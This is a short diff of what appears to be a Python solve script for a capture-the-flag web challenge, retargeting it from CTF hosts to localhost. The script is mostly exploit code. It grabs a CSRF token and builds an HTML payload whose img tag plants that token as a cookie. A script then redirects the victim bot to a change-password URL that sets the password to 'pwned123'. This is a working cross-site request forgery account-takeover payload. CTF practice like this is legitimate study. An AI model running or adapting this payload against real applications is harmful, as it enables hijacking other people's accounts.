@@ -1,7 +1,6 @@
 import requests, sys, re, time, os
 
-APP = "http://app.ctf.local"
-API = "http://api.ctf.local"
+APP = "http://localhost:5000"
 BOT = os.environ.get("BOT_URL", "http://localhost:8888")
 
 U = "pwner1337"
@@ -16,7 +15,7 @@ def main():
     c = s.cookies.get("csrf_token")
     print("csrf:", c)
 
-    e = f"""<img src="{API}/cookie/set?name=csrf_token&value={c}">
+    e = f"""<img src="{APP}/cookie/set?name=csrf_token&value={c}">
 <script>
 setTimeout(function() {{
   window.location = "{APP}/change-password?password=pwned123&csrf_token={c}";
